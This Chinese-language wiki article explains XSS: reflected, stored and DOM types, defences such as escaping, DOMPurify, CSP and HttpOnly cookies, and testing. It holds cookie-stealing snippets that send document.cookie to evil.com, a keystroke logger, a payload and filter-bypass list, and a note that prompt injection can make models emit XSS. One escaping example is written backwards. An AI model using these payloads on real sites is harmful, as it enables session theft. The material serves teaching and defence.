---
title: XSS 跨站脚本
type: concept
tags: [cs, programming, mature]
sources: [raw/计算机/]
created: 2026-05-05
updated: 2026-05-05
summary: XSS 是攻击者把恶意脚本注入网页,在受害者浏览器中执行的攻击,分反射、存储、DOM 三类,通过转义输出 + Content Security Policy 是主要防御,现代 React/Vue 框架默认转义已大幅降低风险。
---

# XSS 跨站脚本

## 定义

**XSS(Cross-Site Scripting)** 是攻击者把恶意 JavaScript 注入网页,在其他用户浏览器中执行的攻击。"Cross-Site"指脚本来自外部攻击者而非站点本身。一旦执行,攻击者可窃取 Cookie、伪造请求、键盘记录、植入挖矿、跳转钓鱼。

XSS 长期是 [[OWASP Top 10]] 高危漏洞,2021 版归入"注入"类(A03)。它是对客户端的攻击,与 [[SQL注入]](服务端攻击)互补。

## 三大类型

**1. Reflected XSS(反射型)**

恶意脚本在 URL 参数中,服务器把参数原样回显到 HTML:

```
https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

服务器返回:`<p>搜索结果:<script>...</script></p>`

攻击需诱导受害者点击 URL(钓鱼链接、社交工程)。

**2. Stored XSS(存储型)**

恶意脚本被存到数据库,后续访问者都受害:

- 论坛评论里写 `<script>...</script>`
- 用户名设为 `<img src=x onerror=...>`
- 客服工单被管理员查看时执行

危害最大——影响每个查看者,无需诱导。

**3. DOM-based XSS**

服务器响应正常,但前端 JS 用未净化的输入操作 DOM:

```javascript
document.body.innerHTML = location.hash.substring(1);  // 危险
```

URL 含 #<img src=x onerror=alert(1)> 即触发。SPA 时代常见类型。

## 常见 payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)"></iframe>
<body onload=alert(1)>
"><script>alert(1)</script>
```

绕过过滤的变形:
- 大小写混合 `<ScRiPt>`
- HTML 实体编码 `&#60;script&#62;`
- 双写绕过 `<scrscriptipt>`(过滤 script 后剩 script)
- 编码 URL `%3Cscript%3E`

## 危害

**1. Cookie 窃取**

```javascript
new Image().src = 'https://evil.com/?c=' + document.cookie
```

如果 Session Cookie 没设 HttpOnly,攻击者获得用户身份,登录任意账号。

**2. CSRF 升级**

XSS 让攻击者完全控制浏览器,可绕过大多数 [[CSRF]] 防御(SameSite、Token 都没用)。

**3. 键盘记录**

```javascript
document.addEventListener('keypress', e => fetch('/log?k=' + e.key))
```

**4. 钓鱼内容注入**

替换页面"登录"按钮指向假表单。

**5. 加密货币挖矿**

注入 mining 脚本占用 CPU。

**6. 蠕虫传播**

存储型 XSS 在社交网络可指数级传播(Samy worm 2005 MySpace 一天 100 万感染)。

## 防御方法

**1. 输出编码(Output Encoding)**

按上下文转义:
- HTML 文本:`&lt;` → `<`、`&amp;` → `&`、`&quot;`、`&#x27;`
- HTML 属性:同上 + 用引号包属性值
- JavaScript 内嵌:复杂,**避免在 script 标签内插入数据**
- URL 参数:encodeURIComponent
- CSS:严格白名单

**现代框架默认转义**:
- [[React]]:JSX 中 {variable} 自动转义
- [[Vue]]:{{variable}} 自动转义
- Angular:[(ngModel)] 自动转义
- 旧模板(EJS、Jinja2)也默认 escape

**危险接口(开发者主动绕过)**:
- React: dangerouslySetInnerHTML
- Vue: v-html
- innerHTML
- document.write
- eval / Function constructor

仅在内容已严格清洗时使用,且需 Code Review 重点关注。

**2. HTML Sanitization**

允许富文本时,用 DOMPurify、bleach、sanitize-html 等库清洗,只保留白名单标签和属性:

```javascript
const clean = DOMPurify.sanitize(userInput)
element.innerHTML = clean
```

不要自己写正则匹配 `<script>` —— 永远漏。

**3. Content Security Policy(CSP)**

HTTP Header 限制脚本来源:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

即使代码有 XSS,浏览器拒绝执行非白名单源的脚本。详见 [[CSP内容安全策略]]。

**4. HttpOnly Cookie**

Session Cookie 设 HttpOnly 阻止 JS 读取:

```
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
```

XSS 仍能伪造请求(已登录状态浏览器自动带 Cookie),但拿不走 Cookie 本身,即使下次会话也会过期。

**5. SameSite Cookie**

防止跨站请求自动带 Cookie,降低 XSS + CSRF 联动风险。

**6. X-Content-Type-Options: nosniff**

阻止浏览器把响应当成 HTML(防御内容嗅探攻击)。

**7. Subresource Integrity(SRI)**

加载 CDN 脚本时校验哈希:
```html
<script src="https://cdn/bootstrap.js"
        integrity="sha384-..." crossorigin="anonymous"></script>
```

防止 CDN 被篡改导致全站 XSS。

## 现代框架与 XSS

**React / Vue / Angular**

- 默认安全(模板自动转义)
- 漏洞主要来自:dangerouslySetInnerHTML / v-html / [innerHTML]
- 服务器渲染([[SSR]])时仍需注意 HTML 注入
- href={url} 中 url 含 javascript: 仍可能 XSS

**审查重点**

- 搜索代码库中所有 dangerouslySetInnerHTML / v-html
- 确认源数据已 sanitize
- 富文本编辑器(TinyMCE、Quill)输出必须 sanitize
- Markdown 渲染(marked、markdown-it)开 sanitize 选项

## 测试与扫描

**手工测试**

每个用户输入点尝试:
- `<svg/onload=alert(1)>`(短而通用)
- `"><img src=x onerror=alert(1)>`(属性逃逸)
- 不同 HTML / JS 上下文测试

**自动化**

- OWASP ZAP、Burp Suite Scanner
- XSS Hunter:检测盲 XSS(管理员后台触发)
- SAST 扫描代码中的危险接口

## 局限与挑战

- **Rich Text 编辑器**:既要保留 HTML 又要安全,Sanitization 是平衡艺术
- **第三方组件**:广告 SDK、嵌入 iframe 风险
- **遗留系统**:模板引擎不自动转义
- **Markdown / WYSIWYG**:用户可输入 HTML
- **CSP 部署难**:严格 CSP 与现有代码冲突,渐进式("Report-Only")是常见方法

## XSS 在 LLM/AI 应用中

新型 XSS 风险:
- AI 生成 HTML 直接渲染 → 模型可能在内容中嵌入 onerror 属性
- [[提示注入]] 可让模型故意生成 XSS payload
- 防御:模型输出经 DOMPurify 清洗,不直接 innerHTML

## 历史教训

- **MySpace Samy Worm(2005)**:存储型 XSS,一天感染 100 万
- **Twitter onMouseOver(2010)**:URL 短缩服务漏洞,自动转推蠕虫
- **eBay 多次**:商品描述富文本 XSS
- **WordPress 插件**:历史最多 XSS 来源之一

## 和其他概念的关系

XSS 与 [[CSRF]]、[[SQL注入]]、[[SSRF]] 共同构成 [[Web安全]] 核心风险图谱。它的防御依赖 [[CSP内容安全策略]]、Cookie 安全属性([[Cookie与Session]])、[[Web安全]] 头部组合。

XSS 与 [[CORS跨域资源共享]] 关注点不同——CORS 是浏览器对跨源请求的保护机制,XSS 是同源攻击者代码注入。

现代 Web 框架([[React]]、[[Vue]])的默认转义大幅降低了 XSS 频率,反映出"安全默认"在 [[设计原则SOLID]] 之外的工程哲学:**让正确的事容易,错误的事困难**。

## 参考源

- raw/计算机/
- 相关:[[OWASP Top 10]]、[[CSP内容安全策略]]、[[CSRF]]
